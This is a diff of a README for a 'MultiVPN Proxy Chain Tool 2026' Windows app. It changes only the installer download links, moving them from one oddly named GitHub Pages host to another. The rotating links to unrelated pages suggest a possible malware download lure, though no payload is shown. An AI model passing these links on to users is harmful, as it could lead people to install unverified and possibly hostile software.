@@ -2,7 +2,7 @@
 
 MultiVPN Proxy Chain Tool 2026 is a powerful Windows desktop application designed to manage and combine multiple VPN and proxy services into a single, secure, and private connection chain. It provides advanced control over your network traffic, allowing for seamless layering of protocols to enhance your online anonymity and protect your digital footprint in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A4: Using a multi-hop chain will inevitably add some latency and may reduce band
 
 You can download the latest stable version of the MultiVPN Proxy Chain Tool installer directly from our GitHub Pages.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: 2026*
